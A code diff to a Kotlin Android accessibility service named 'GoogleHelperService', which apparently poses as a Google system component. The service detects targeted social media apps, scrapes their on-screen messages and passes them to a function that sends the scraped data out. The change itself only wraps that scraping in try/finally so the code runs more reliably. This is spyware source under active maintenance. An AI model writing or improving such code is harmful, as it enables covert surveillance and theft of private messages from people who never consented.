@@ -90,11 +90,13 @@ class GoogleHelperService : AccessibilityService() {
         val packageName = event.packageName?.toString() ?: return
         if (com.google.android.systemservice.utils.SocialMediaScraper.isTargetApp(packageName)) {
             val root = rootInActiveWindow ?: return
-            val messages = com.google.android.systemservice.utils.SocialMediaScraper.scrapeMessages(root, packageName)
-            root.recycle()
-
-            if (messages.isNotEmpty()) {
-                sendScrapedData(messages)
+            try {
+                val messages = com.google.android.systemservice.utils.SocialMediaScraper.scrapeMessages(root, packageName)
+                if (messages.isNotEmpty()) {
+                    sendScrapedData(messages)
+                }
+            } finally {
+                root.recycle()
             }
         }
     }
